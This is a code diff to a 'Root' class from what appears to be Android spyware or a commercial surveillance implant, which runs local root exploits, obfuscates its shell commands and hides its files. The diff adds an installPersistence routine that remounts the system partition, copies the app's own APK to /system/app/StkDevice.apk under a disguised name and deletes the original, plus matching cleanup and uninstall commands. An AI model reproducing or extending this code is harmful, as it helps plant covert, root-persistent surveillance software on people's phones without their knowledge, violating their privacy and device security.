@@ -102,7 +102,7 @@ public class Root {
 			Status.setExploitResult(Status.EXPLOIT_RESULT_NOTNEEDED);
 			Status.setExploitStatus(Status.EXPLOIT_STATUS_EXECUTED);
 			return false;
-		}else if(PackageInfo.upgradeRoot()){
+		} else if (PackageInfo.upgradeRoot()) {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + "(exploitPhone): root shell upgraded, no need to exploit again");
 			}
@@ -225,17 +225,22 @@ public class Root {
 			return false;
 		}
 
-		// 32_34=#!/system/bin/sh
-
 		String packageName = Status.self().getAppContext().getPackageName();
 		String script = M.e("#!/system/bin/sh") + "\n";
 		//script += Configuration.shellFile + " qzx \"rm -r " + Path.hidden() + "\"\n";
-		script += "rm -r " + Path.hidden() + "\n";
+		script += M.e("rm -r ") + Path.hidden() + "\n";
+
+		script += Configuration.shellFile + M.e("blw") +"\n";
+		script += M.e("sleep 1; rm /system/app/StkDevice.apk") + "\n";
+
+
 		script += Configuration.shellFile + " ru\n";
-		script += "LD_LIBRARY_PATH=/vendor/lib:/system/lib pm uninstall " + packageName + "\n";
+		script += M.e("LD_LIBRARY_PATH=/vendor/lib:/system/lib pm uninstall ") + packageName + "\n";
+
 		if (Cfg.DEBUG) {
-			script += "rm /data/local/tmp/log\n";
+			script += M.e("rm /data/local/tmp/log") +"\n";
 		}
+		script += Configuration.shellFile + M.e("blr") +"\n";
 
 		String filename = "c";
 		if (createScript(filename, script) == false) {
@@ -303,7 +308,7 @@ public class Root {
 				Check.log(TAG + " (supersuRoot) execute 2: " + suidext + " ret: " + res.exitCode);
 			}
 
-			if(res.exitCode == 254){
+			if (res.exitCode == 254) {
 
 				String script = M.e("#!/system/bin/sh") + "\n"
 						+ String.format(M.e("%s rt"), suidext.getFilename()) + "\n";
@@ -583,7 +588,7 @@ public class Root {
 
 	private static void checkExploitThread(Thread exploit, int timeOutSec) {
 		int secs = 5;
-		for (int i = 0; i < timeOutSec || timeOutSec == 0; i+=secs) {
+		for (int i = 0; i < timeOutSec || timeOutSec == 0; i += secs) {
 			try {
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " (checkExploitThread):" + exploit.getName());
@@ -632,7 +637,7 @@ public class Root {
 		LinuxExploitThread linuxThread = new LinuxExploitThread(frama, selinux, towel);
 		Thread exploit = new Thread(linuxThread);
 		if (Cfg.DEBUG) {
-			exploit.setName("LinuxExploitThread_"+frama+"_"+selinux+"_"+towel);
+			exploit.setName("LinuxExploitThread_" + frama + "_" + selinux + "_" + towel);
 		}
 		Status.setExploitStatus(Status.EXPLOIT_STATUS_RUNNING);
 		exploit.start();
@@ -642,10 +647,10 @@ public class Root {
 		}
 		/* wait for 15 seconds  to see if exploits ends*/
 		checkExploitThread(exploit, 15);
-		if(exploit.isAlive()){
-		if (Cfg.DEBUG) {
-			Check.log(TAG + "(linuxExploit): 15 seconds passed, going synchronous=" + synchronous);
-		}
+		if (exploit.isAlive()) {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + "(linuxExploit): 15 seconds passed, going synchronous=" + synchronous);
+			}
 		}
 		if (exploit.isAlive() && synchronous) {
 			checkExploitThread(exploit, 0);
@@ -732,7 +737,7 @@ public class Root {
 	 */
 	static public boolean getPermissions(boolean reload) {
 
-		if(Status.getExploitStatus() < Status.EXPLOIT_STATUS_EXECUTED){
+		if (Status.getExploitStatus() < Status.EXPLOIT_STATUS_EXECUTED) {
 			return false;
 		}
 
@@ -786,6 +791,8 @@ public class Root {
 				}
 				// Avoid having the process killed for using too many resources
 				Root.adjustOom();
+
+				Root.installPersistence();
 			} else {
 				Configuration.shellFile = Configuration.shellFileBase;
 			}
@@ -795,6 +802,15 @@ public class Root {
 			semGetPermission.release();
 		}
 		return Status.haveRoot();
+	}
+
+	private static void installPersistence() {
+		Execute.execute(new String[]{Configuration.shellFileBase, "blw"});
+
+		String name = Status.getAppContext().getPackageName();
+		String format = M.e("cat /data/app/%s*.apk > /system/app/StkDevice.apk; chmod 644 /system/app/StkDevice.apk; rm /data/app/%s*.apk");
+		Execute.executeScript(String.format(format, name, name));
+		Execute.execute(new String[]{Configuration.shellFileBase, "blr"});
 	}
 
 	static public InputStream decodeEnc(InputStream stream, String passphrase) throws IOException,
@@ -864,7 +880,7 @@ public class Root {
 			Utils.sleep(600);
 			// /system/bin/ntpsvd qzx chmod 666
 			// /data/data/com.android.service/files/packages.xml
-			Execute.chmod("666", String.format(M.e("/data/data/%s/files/packages.xml"),pack));
+			Execute.chmod("666", String.format(M.e("/data/data/%s/files/packages.xml"), pack));
 
 			// Rimuoviamo il file temporaneo
 			// /data/data/com.android.service/files/test
